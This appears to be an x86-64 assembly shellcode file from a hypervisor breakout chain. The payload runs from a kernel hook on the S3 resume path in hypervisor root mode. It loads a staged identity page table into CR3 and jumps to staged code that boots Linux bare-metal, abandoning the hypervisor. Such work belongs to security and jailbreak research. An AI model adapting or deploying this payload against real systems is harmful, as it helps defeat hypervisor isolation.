.intel_syntax noprefix
.text
.global shellcode
.type shellcode, @function

// Layout matches shellcode_break_hv so the IDT-gate khook resume can target it:
//   page+0x000 - code
//   page+0xf00 - stack (grows down)
//
// This payload is invoked by the khook on the S3 resume path while executing in
// hypervisor root mode. Instead of returning to the guest it abandons the
// hypervisor: it switches CR3 to the identity page table (staged at
// cave_hv_paging) and jumps into shellcode_hv (staged at cave_hv_code), which
// boots Linux bare-metal. Both the payload page and the cave are inside the
// 0..5 GiB identity range, so the transition is safe. No stack is used between
// the CR3 load and shellcode_hv taking over.

shellcode:
    lea     rsp, [rip + 0xef9]          // rsp = page + 0xf00 (identity mapped)
    movabs  rax, CAVE_HV_PAGING         // identity PML4 physical address
    mov     cr3, rax
    movabs  rax, CAVE_HV_CODE           // shellcode_hv physical address
    jmp     rax
.size shellcode, .-shellcode
